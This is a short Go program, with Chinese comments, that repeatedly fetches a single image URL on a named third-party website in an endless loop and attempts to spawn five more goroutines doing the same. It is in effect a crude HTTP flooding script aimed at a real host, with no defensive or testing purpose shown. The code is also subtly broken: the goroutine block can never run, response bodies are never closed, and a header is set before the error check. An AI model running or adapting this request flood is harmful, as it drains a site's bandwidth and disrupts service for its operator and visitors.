package main

import (
	"net/http"
	"strings"
	"io/ioutil"
	"sync"
)

func HttpGet(url string) (err error) {
	//生成client 参数为默认
	client := &http.Client{}
	//提交请求
	reqest, err := http.NewRequest("GET", url, strings.NewReader(""))
	reqest.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if err != nil {
		return
	}
	//处理返回结果
	response, err := client.Do(reqest)
	if err != nil {
		return
	}
	_, err = ioutil.ReadAll(response.Body)
	if err != nil {
		return
	}
	return
}

func main() {
	url := `http://www.diyomate.com/uploads/ad/14689129453965.jpg`
	for {
		HttpGet(url)
	}
	group := new(sync.WaitGroup)
	for i := 0; i < 5; i++ {
		group.Add(1)
		go func() {
			for {
				HttpGet(url)
			}
			group.Done()
		}()
	}
}